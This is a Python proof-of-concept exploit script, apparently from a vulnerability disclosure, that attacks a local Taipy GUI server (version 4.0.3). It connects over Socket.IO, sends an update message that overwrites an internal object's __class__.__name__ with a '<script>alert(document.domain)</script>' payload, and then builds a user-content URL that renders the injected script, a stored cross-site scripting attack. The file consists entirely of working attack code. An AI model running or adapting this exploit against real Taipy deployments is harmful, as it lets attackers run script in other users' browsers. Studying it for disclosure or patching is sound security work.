import logging
import socketio
import requests
from requests.models import PreparedRequest
import time

logging.basicConfig(level=logging.INFO)

client_id = "global"
session = requests.Session()
sio = socketio.Client()

@sio.event
def connect():
    logging.info("Connected to server")

@sio.event
def message(data):
    logging.info("Message received:", data)

@sio.event
def disconnect():
    logging.info("Disconnected from server")

def warmup():
    session.get("http://127.0.0.1:5003/")
    session.get(f"http://127.0.0.1:5003/taipy-init?client_id={client_id}&v=4.0.3")
    logging.info("Warmup completed")

def pollute(key, value):
    sio.connect('http://127.0.0.1:5003', transports=['polling'], wait_timeout=60)
    sio.send({
        "type": "U",
        "name": key,
        "payload": {"value": value},
        "module_context": "__main__",
        "client_id": client_id
    })

    logging.info(f"Polluted key: {key} with value: {value}")
    time.sleep(1)
    sio.disconnect()

def xss(key):
    url = "http://127.0.0.1:5003/taipy-user-content/hello"
    params = {'__taipy_html_content': 'y', 'variable_name': key, 'client_id': client_id}

    req = PreparedRequest()
    req.prepare_url(url, params)
    logging.info("Target URL: " + req.url)

if __name__ == "__main__":
    warmup()
    pollute("tp_TpExPr_gui_get_adapted_lov_past_conversations_NoneType_TPMDL_2_0.__class__.__name__", "<script>alert(document.domain)</script>")
    xss("tp_TpExPr_gui_get_adapted_lov_past_conversations_NoneType_TPMDL_2_0")

